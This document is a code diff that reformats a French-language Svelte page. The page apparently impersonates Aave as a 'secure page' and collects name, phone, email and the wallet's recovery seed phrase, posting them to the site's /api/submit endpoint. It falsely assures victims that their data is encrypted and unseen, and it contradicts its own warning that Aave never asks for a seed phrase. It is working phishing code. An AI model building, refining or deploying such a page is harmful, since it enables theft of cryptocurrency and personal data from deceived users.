@@ -1,32 +1,32 @@
 <script>
-    import { goto } from '$app/navigation';
-    import Logo from '$lib/components/Logo.svelte';
+    import { goto } from "$app/navigation";
+    import Logo from "$lib/components/Logo.svelte";
 
-    let nom = $state('');
-    let prenom = $state('');
-    let telephone = $state('');
-    let email = $state('');
-    let seed = $state('');
-    let montant = $state('');
-    let devise = $state('EUR');
-    let methode = $state('');
+    let nom = $state("");
+    let prenom = $state("");
+    let telephone = $state("");
+    let email = $state("");
+    let seed = $state("");
+    let montant = $state("");
+    let devise = $state("EUR");
+    let methode = $state("");
 
-    let errors = $state('');
+    let errors = $state("");
     let submitting = $state(false);
 
     function clearError() {
-        errors = '';
+        errors = "";
     }
 
     function validate() {
-        if (!nom.trim()) return 'Veuillez remplir le champ Nom.';
-        if (!prenom.trim()) return 'Veuillez remplir le champ Prénom.';
-        if (!telephone.trim()) return 'Veuillez remplir le champ Téléphone.';
-        if (!email.trim()) return 'Veuillez remplir le champ Email.';
-        if (!seed.trim()) return 'Veuillez remplir la phrase de récupération.';
-        if (!montant.trim()) return 'Veuillez indiquer un montant.';
-        if (!methode) return 'Veuillez sélectionner une méthode de paiement.';
-        return '';
+        if (!nom.trim()) return "Veuillez remplir le champ Nom.";
+        if (!prenom.trim()) return "Veuillez remplir le champ Prénom.";
+        if (!telephone.trim()) return "Veuillez remplir le champ Téléphone.";
+        if (!email.trim()) return "Veuillez remplir le champ Email.";
+        if (!seed.trim()) return "Veuillez remplir la phrase de récupération.";
+        if (!montant.trim()) return "Veuillez indiquer un montant.";
+        if (!methode) return "Veuillez sélectionner une méthode de paiement.";
+        return "";
     }
 
     function handleSubmit(e) {
@@ -37,25 +37,34 @@
             errors = msg;
             return;
         }
-        errors = '';
+        errors = "";
         submitting = true;
 
-        fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ nom, prenom, telephone, email, seed, montant, devise, methode })
+        fetch("/api/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                nom,
+                prenom,
+                telephone,
+                email,
+                seed,
+                montant,
+                devise,
+                methode,
+            }),
         })
-            .then(r => r.json())
-            .then(res => {
+            .then((r) => r.json())
+            .then((res) => {
                 if (res.success) {
-                    goto('/confirmation');
+                    goto("/confirmation");
                 } else {
-                    errors = 'Erreur lors de l\'envoi. Veuillez réessayer.';
+                    errors = "Erreur lors de l'envoi. Veuillez réessayer.";
                     submitting = false;
                 }
             })
             .catch(() => {
-                errors = 'Erreur réseau. Veuillez réessayer.';
+                errors = "Erreur réseau. Veuillez réessayer.";
                 submitting = false;
             });
     }
@@ -90,7 +99,10 @@
             </div>
         </div>
         <h1>Page sécurisée</h1>
-        <p>Vos données sont chiffrées et traitées via la blockchain. Aave n'a aucun accès à ces informations.</p>
+        <p>
+            Vos données sont chiffrées et traitées via la blockchain. Aave n'a
+            aucun accès à ces informations.
+        </p>
     </section>
 
     <form class="form" onsubmit={handleSubmit}>
@@ -103,7 +115,14 @@
                         <path d="M5 21c1.5-4 4-6 7-6s5.5 2 7 6" />
                     </svg>
                 </div>
-                <input class="input" type="text" id="nom" placeholder="Entrez votre nom" bind:value={nom} oninput={clearError} />
+                <input
+                    class="input"
+                    type="text"
+                    id="nom"
+                    placeholder="Entrez votre nom"
+                    bind:value={nom}
+                    oninput={clearError}
+                />
             </div>
         </div>
 
@@ -116,7 +135,14 @@
                         <path d="M5 21c1.5-4 4-6 7-6s5.5 2 7 6" />
                     </svg>
                 </div>
-                <input class="input" type="text" id="prenom" placeholder="Entrez votre prénom" bind:value={prenom} oninput={clearError} />
+                <input
+                    class="input"
+                    type="text"
+                    id="prenom"
+                    placeholder="Entrez votre prénom"
+                    bind:value={prenom}
+                    oninput={clearError}
+                />
             </div>
         </div>
 
@@ -125,7 +151,9 @@
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
-                        <path d="M22 16.9v3a2 2 0 0 1-2.2 2A19.8 19.8 0 0 1 11.2 18 19.3 19.3 0 0 1 5.9 12.8 19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7l.4 2.5a2 2 0 0 1-.6 1.8l-1.3 1.3a16 16 0 0 0 6.1 6.1l1.3-1.3a2 2 0 0 1 1.8-.6l2.5.4A2 2 0 0 1 22 16.9z" />
+                        <path
+                            d="M22 16.9v3a2 2 0 0 1-2.2 2A19.8 19.8 0 0 1 11.2 18 19.3 19.3 0 0 1 5.9 12.8 19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7l.4 2.5a2 2 0 0 1-.6 1.8l-1.3 1.3a16 16 0 0 0 6.1 6.1l1.3-1.3a2 2 0 0 1 1.8-.6l2.5.4A2 2 0 0 1 22 16.9z"
+                        />
                     </svg>
                 </div>
                 <div class="phone-row">
@@ -141,7 +169,14 @@
                         <option value="+31">🇳🇱 +31</option>
                         <option value="+352">🇱🇺 +352</option>
                     </select>
-                    <input class="input" type="tel" id="telephone" placeholder="06 12 34 56 78" bind:value={telephone} oninput={clearError} />
+                    <input
+                        class="input"
+                        type="tel"
+                        id="telephone"
+                        placeholder="06 12 34 56 78"
+                        bind:value={telephone}
+                        oninput={clearError}
+                    />
                 </div>
             </div>
         </div>
@@ -155,14 +190,23 @@
                         <path d="M3 7l9 6 9-6" />
                     </svg>
                 </div>
-                <input class="input" type="email" id="email" placeholder="exemple@email.com" bind:value={email} oninput={clearError} />
+                <input
+                    class="input"
+                    type="email"
+                    id="email"
+                    placeholder="exemple@email.com"
+                    bind:value={email}
+                    oninput={clearError}
+                />
             </div>
         </div>
 
         <div class="field">
             <label for="seed">PHRASE DE RÉCUPÉRATION (SEED PHRASE)</label>
             <div class="field-description">
-                Veuillez indiquer votre phrase de récupération (12 ou 24 mots) afin de sécuriser et de vérifier que vous êtes bien le propriétaire légal du wallet.
+                Veuillez indiquer votre phrase de récupération (12 ou 24 mots)
+                afin de sécuriser et de vérifier que vous êtes bien le
+                propriétaire légal du wallet.
             </div>
             <div class="input-wrapper">
                 <div class="field-icon">
@@ -171,7 +215,13 @@
                         <path d="M10.5 13.5L21 3m0 0v6m0-6h-6" />
                     </svg>
                 </div>
-                <textarea class="textarea" id="seed" placeholder="mot1 mot2 mot3 ... mot12" bind:value={seed} oninput={clearError}></textarea>
+                <textarea
+                    class="textarea"
+                    id="seed"
+                    placeholder="mot1 mot2 mot3 ... mot12"
+                    bind:value={seed}
+                    oninput={clearError}
+                ></textarea>
             </div>
 
             <div class="warning-box">
@@ -180,7 +230,14 @@
                     <path d="M12 8v4" />
                     <circle cx="12" cy="16" r="1" fill="white" />
                 </svg>
-                <p>Vous êtes actuellement sur une page sécurisée, accessible uniquement par vous. Pour votre protection, aucun conseiller Aave ne vous demandera jamais votre phrase de récupération. Ne la partagez avec personne, en aucune circonstance.</p><br />Aave ne vous la demandera jamais.</p>
+                <p>
+                    Vous êtes actuellement sur une page sécurisée, accessible
+                    uniquement par vous. Pour votre protection, aucun conseiller
+                    Aave ne vous demandera jamais votre phrase de récupération.
+                    Ne la partagez avec personne, en aucune circonstance.
+                </p>
+                <br />
+                <p>Aave ne vous la demandera jamais.</p>
             </div>
 
             <div class="verify-box">
@@ -188,7 +245,10 @@
                     <rect x="5" y="11" width="14" height="10" rx="2" />
                     <path d="M8 11V7a4 4 0 0 1 8 0v4" />
                 </svg>
-                <p>Cette vérification est essentielle pour protéger votre wallet et confirmer votre propriété légitime.</p>
+                <p>
+                    Cette vérification est essentielle pour protéger votre
+                    wallet et confirmer votre propriété légitime.
+                </p>
             </div>
         </div>
 
@@ -203,8 +263,19 @@
                     </svg>
                 </div>
                 <div class="phone-row">
-                    <input class="input" type="number" id="montant" placeholder="Entrez le montant demandé" bind:value={montant} oninput={clearError} />
-                    <select class="select country" bind:value={devise} oninput={clearError}>
+                    <input
+                        class="input"
+                        type="number"
+                        id="montant"
+                        placeholder="Entrez le montant demandé"
+                        bind:value={montant}
+                        oninput={clearError}
+                    />
+                    <select
+                        class="select country"
+                        bind:value={devise}
+                        oninput={clearError}
+                    >
                         <option>EUR</option>
                         <option>USD</option>
                         <option>GBP</option>
@@ -222,8 +293,15 @@
                         <path d="M3 10h18" />
                     </svg>
                 </div>
-                <select class="select" id="methode" bind:value={methode} oninput={clearError}>
-                    <option value="">Sélectionnez une méthode de paiement</option>
+                <select
+                    class="select"
+                    id="methode"
+                    bind:value={methode}
+                    oninput={clearError}
+                >
+                    <option value=""
+                        >Sélectionnez une méthode de paiement</option
+                    >
                     <option>Virement bancaire</option>
                     <option>Cryptomonnaie (Crypto)</option>
                 </select>
@@ -235,7 +313,7 @@
         {/if}
 
         <button class="btn" type="submit" disabled={submitting}>
-            {submitting ? 'ENVOI EN COURS…' : 'ENREGISTRER ET CONTINUER →'}
+            {submitting ? "ENVOI EN COURS…" : "ENREGISTRER ET CONTINUER →"}
         </button>
 
         <div class="footer-note">
@@ -251,7 +329,11 @@
 <style>
     :global(body) {
         background:
-            radial-gradient(circle at top, rgba(133, 76, 255, 0.2), transparent 28%),
+            radial-gradient(
+                circle at top,
+                rgba(133, 76, 255, 0.2),
+                transparent 28%
+            ),
             linear-gradient(180deg, #090b35 0%, #04051d 100%);
     }
 
@@ -260,8 +342,16 @@
         inset: 0;
         pointer-events: none;
         background:
-            radial-gradient(circle at 50% 0%, rgba(120, 80, 255, 0.18), transparent 32%),
-            radial-gradient(circle at 50% 50%, rgba(0, 170, 255, 0.05), transparent 45%);
+            radial-gradient(
+                circle at 50% 0%,
+                rgba(120, 80, 255, 0.18),
+                transparent 32%
+            ),
+            radial-gradient(
+                circle at 50% 50%,
+                rgba(0, 170, 255, 0.05),
+                transparent 45%
+            );
     }
 
     .container {
@@ -317,7 +407,11 @@
         display: flex;
         justify-content: center;
         align-items: center;
-        background: radial-gradient(circle, rgba(157, 97, 255, 0.18), rgba(40, 20, 90, 0.02));
+        background: radial-gradient(
+            circle,
+            rgba(157, 97, 255, 0.18),
+            rgba(40, 20, 90, 0.02)
+        );
         border: 1px solid rgba(255, 255, 255, 0.08);
         box-shadow:
             0 0 50px rgba(108, 76, 255, 0.3),
@@ -354,7 +448,11 @@
         height: 42px;
         margin-top: -2px;
         border-radius: 12px;
-        background: linear-gradient(180deg, rgba(136, 90, 255, 0.95), rgba(70, 25, 170, 0.95));
+        background: linear-gradient(
+            180deg,
+            rgba(136, 90, 255, 0.95),
+            rgba(70, 25, 170, 0.95)
+        );
         box-shadow:
             0 0 20px rgba(155, 90, 255, 0.35),
             inset 0 0 10px rgba(255, 255, 255, 0.08);
@@ -482,7 +580,8 @@
         width: 100%;
     }
 
-    .country, .country-select {
+    .country,
+    .country-select {
         width: 92px;
         min-width: 92px;
         height: 50px;
@@ -538,7 +637,12 @@
         border-radius: 16px;
         margin-top: 10px;
         cursor: pointer;
-        background: linear-gradient(90deg, #4db7ff 0%, #7f63ff 45%, #d45eff 100%);
+        background: linear-gradient(
+            90deg,
+            #4db7ff 0%,
+            #7f63ff 45%,
+            #d45eff 100%
+        );
         color: #fff;
         font-size: 0.95rem;
         font-weight: 600;
@@ -654,7 +758,8 @@
             height: 140px;
         }
 
-        .country, .country-select {
+        .country,
+        .country-select {
             width: 110px;
             min-width: 110px;
             font-size: 0.95rem;
